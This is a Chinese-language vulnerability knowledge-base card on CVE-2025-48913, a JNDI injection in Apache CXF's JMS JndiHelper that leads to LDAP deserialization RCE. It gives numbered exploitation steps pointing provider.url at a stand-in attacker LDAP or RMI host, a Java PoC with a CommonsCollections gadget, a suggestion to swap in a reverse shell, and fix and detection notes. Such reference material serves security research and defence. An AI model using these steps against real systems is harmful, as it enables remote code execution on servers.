---
id: web-java-jndi-cxf-jms-jndihelper-provider-url-rce
title: Apache CXF JMS JndiHelper 未校验 java.naming.provider.url：可控 JNDI 环境经 LDAP 反序列化 RCE（CVE-2025-48913）
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: cxf-jms-jndihelper-provider-url-jndi-injection
aliases:
- CVE-2025-48913
- Apache CXF JNDI 注入
- CXF JMS RCE
- JndiHelper lookup
- java.naming.provider.url
- JMSConfiguration getConnectionFactory
- Unsafe protocol in JNDI URL
tags:
- java
- jndi
- ldap
- rmi
- deserialization
- apache-cxf
- jms
- rce
- cve-2025-48913
cve:
- CVE-2025-48913
severity: critical
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V51
  verified_at: '2026-11-05T09:06:53+08:00'
  notes: 已对照原文与8张图核对：JndiHelper 构造函数仅保存 environment，lookup 用 new InitialContext(environment).lookup(name)；JMSConfiguration#getConnectionFactory→getConnectionFactoryFromJndi→JndiHelper.lookup；本地 demo 设 ldap://127.0.0.1:9999 与 CommonsCollections gadget，弹计算器；4.1.3 修复为 ALLOWED_PROTOCOLS 白名单并抛 Unsafe protocol in JNDI URL。卡与原文一致。未验证点：文章未给出远程获取 JNDI 配置控制权的入口，仅为本地 demo，卡已标 medium；frontmatter 无 sources/source_url。
---

## 一句话结论

Apache CXF 的 JMS 传输模块中，`JndiHelper` 构造函数直接保存外部传入的 `Properties`，`lookup()` 用 `new InitialContext(this.environment)` 初始化 JNDI；当攻击者能控制 `java.naming.provider.url` 时，可将其指向恶意 LDAP/RMI 服务，`JMSConfiguration#getConnectionFactoryFromJndi()` 触发的 `ctx.lookup()` 会加载远程 `javaSerializedData`，在存在可用 gadget 的 classpath 下执行任意代码（CVE-2025-48913）。

## 原理

- 调用链：`JMSConfiguration#getConnectionFactory()` → `getConnectionFactoryFromJndi()`（当 `jndiEnvironment != null` 且 `connectionFactoryName != null`）→ `new JndiHelper(this.getJndiEnvironment()).lookup(connectionFactoryName, ConnectionFactory.class)`。
- `JndiHelper` 代码：构造函数只做 `this.environment = environment;`，没有任何校验；`lookup()` 直接 `Context ctx = new InitialContext(this.environment); Object located = ctx.lookup(name);`。
- 缺陷：`InitialContext` 会读取 environment 中的 `java.naming.provider.url` 与 `java.naming.factory.initial`。漏洞版本不校验 provider URL 的协议，攻击者可用 `com.sun.jndi.ldap.LdapCtxFactory` + `ldap://attacker:9999`，并设置 `java.naming.referral=follow`，让 CXF 主动连接攻击者控制的 LDAP/RMI 服务。
- JNDI 注入到 RCE：恶意 LDAP 服务对查询返回带 `javaSerializedData` 的 Entry；客户端 `lookup` 会反序列化该数据，若 classpath 存在 CommonsCollections 等 gadget（文章 demo 引入 commons-collections 3.2.1，JDK 17 下用 TiedMapEntry/LazyMap/ChainedTransformer/InvokerTransformer 链），即可执行 `Runtime.getRuntime().exec("calc")`。
- 触发前提：攻击者必须能控制 JMS 的 `JndiEnvironment`（例如通过配置管理接口、可写配置文件、JMX/管理面或其他注入点）。文章用本地 Java demo 直接调用 `setJndiEnvironment` 验证，未给出远程 Web 入口；因此这是“可控 JNDI 配置 → RCE”的完整原语，但实际远程可达性取决于目标是否暴露配置写入面。
- 修复：`JndiHelper` 构造函数增加 `ALLOWED_PROTOCOLS` 白名单（`vm://`、`tcp://`、`nio://`、`ssl://`、`http://`、`https://`、`ws://`、`wss://`），对 `java.naming.provider.url` 做 `startsWith` 校验，不匹配则抛 `IllegalArgumentException("Unsafe protocol in JNDI URL: ...")`，从而阻断 `ldap://`/`rmi://`。

## 触发条件

- 目标使用受影响版本的 Apache CXF JMS 传输模块（原文复现 4.1.2）。
- 应用调用了 `JMSConfiguration#getConnectionFactory()`，且 `jndiEnvironment` 与 `connectionFactoryName` 均非空。
- 攻击者可控制 `jndiEnvironment` 中的 `java.naming.provider.url` 与 `java.naming.factory.initial`（配置注入/管理接口/默认配置可控等）。
- 目标 classpath 存在可用于 JNDI 反序列化的 gadget（如 CommonsCollections 3.x），或使用其他 LDAP 远程类加载链。
- 目标可出站访问攻击者的 LDAP/RMI 服务。

## 利用步骤

1. 在攻击机启动恶意 LDAP 服务（如 UnboundID InMemoryDirectoryServer），监听 9999，对任意 baseDN 返回 `javaClassName=foo` 与 `javaSerializedData=<CommonsCollections gadget>`。
2. 构造 `Properties`：`Context.INITIAL_CONTEXT_FACTORY=com.sun.jndi.ldap.LdapCtxFactory`、`Context.PROVIDER_URL=ldap://attacker:9999`、`Context.REFERRAL=follow`。
3. 让目标 CXF 的 `JMSConfiguration` 使用该 environment，并设置 `connectionFactoryName`（如 `BS`）。
4. 触发 `getConnectionFactory()`；CXF 发起 LDAP 查询并反序列化返回值，执行 gadget（文章用 `calc` 验证）。
5. 将 gadget 换成命令执行/反弹 shell；若目标无 CommonsCollections，可尝试其他 gadget 或 RMI 远程类加载（受 JDK 版本限制）。

## PoC

```java
// 触发端（文章 demo，JDK 17，classpath 含 commons-collections 3.2.1）
Properties env = new Properties();
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, "ldap://127.0.0.1:9999");
env.put(Context.REFERRAL, "follow");

JMSConfiguration jmsConfig = new JMSConfiguration();
jmsConfig.setJndiEnvironment(env);
jmsConfig.setConnectionFactoryName("BS");

jmsConfig.getConnectionFactory(); // 触发 InitialContext + lookup
```

```text
# 恶意 LDAP 服务（UnboundID）对查询返回：
#   javaClassName = foo
#   javaSerializedData = <CommonsCollections TiedMapEntry/LazyMap/ChainedTransformer gadget>
# 预期：目标执行 Runtime.getRuntime().exec("calc")，弹出计算器（文章截图）。
# 修复版（4.1.3）触发时抛：
#   IllegalArgumentException: Unsafe protocol in JNDI URL: ldap://127.0.0.1:9999
```

## 变体与关联

- 变体：`provider.url` 换成 `rmi://attacker:1099`，走 RMI 注册表返回 Reference/Remote 对象；JDK 高版本默认禁止远程 codebase，需结合本地 gadget 或 LDAP 反序列化。
- 变体：`INITIAL_CONTEXT_FACTORY` 换成其他 JNDI 工厂（如 `com.sun.jndi.rmi.registry.RegistryContextFactory`），扩大协议面。
- 关联：[[web-java-deserialization-jndi-log4j2-login-rce]]（同类 JNDI 注入入口，Log4j2）；[[web-java-deserialization-jndi-ldap-local-factory-h2-init-rce]]（LDAP 返回本地 Factory 的利用方式）；[[web-java-deserialization-jndi-high-version-beanfactory-el]]（高版本 JDK 下 BeanFactory EL 绕过）；[[web-java-deser-jdk-urldns-dns-probe]]（JNDI 探测原语）。
- 边界：文章只验证了“攻击者已控制 JndiEnvironment”的本地 demo，未给出远程获取该控制权的入口；真实目标需存在配置写入/注入面且 classpath 有 gadget，故 confidence 定为 medium。

## 检测与防御

- 检测：审计 CXF JMS 配置中 `java.naming.provider.url` 的来源与可写性；监控 JNDI 出站连接（LDAP 389/636、RMI 1099）与异常 `InitialContext` 调用；关注日志中的 `Unsafe protocol in JNDI URL`（修复后）及 `JndiHelper` 相关异常。
- 修复：升级 Apache CXF 到修复版本（原文 4.1.3 已验证）；确保 `JndiHelper` 的协议白名单生效。
- 加固：禁止不可信来源写入 JMS/JNDI 配置；`java.naming.provider.url` 使用固定可信地址；限制应用出站到 LDAP/RMI 端口；移除不必要的 CommonsCollections 等危险 gadget 依赖；JDK 升级并开启 JNDI 远程类加载限制。
